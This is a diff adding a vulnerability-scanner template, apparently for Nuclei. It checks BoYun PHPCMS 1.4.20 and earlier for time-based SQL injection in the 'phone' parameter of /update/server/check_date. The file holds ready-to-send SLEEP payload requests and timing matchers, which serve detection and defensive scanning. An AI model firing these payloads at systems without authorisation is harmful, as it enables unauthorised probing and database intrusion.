@@ -1,0 +1,22 @@
+id: boyun-phpcms-serverphp-sql
+info:
+  name: "BoYun PHPCMS application Server.php 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    BoYun PHPCMS 1.4.20及以下版本在 application/update/controller/Server.php 组件中，/update/server/check_date 接口（涉及 sn 参数传递路径）存在SQL注入安全缺陷。代码逻辑中 phone 参数值直接拼接至SQL查询语句，缺乏输入验证和参数化处理机制，允许攻击者通过构造恶意输入执行任意SQL命令。
+  tags: BoYun
+http:
+- raw:
+  - |
+    GET /update/server/check_date?phone=1'%20AND%20SLEEP(5)-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /update/server/check_date?phone=1'%20AND%20SLEEP(8)-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
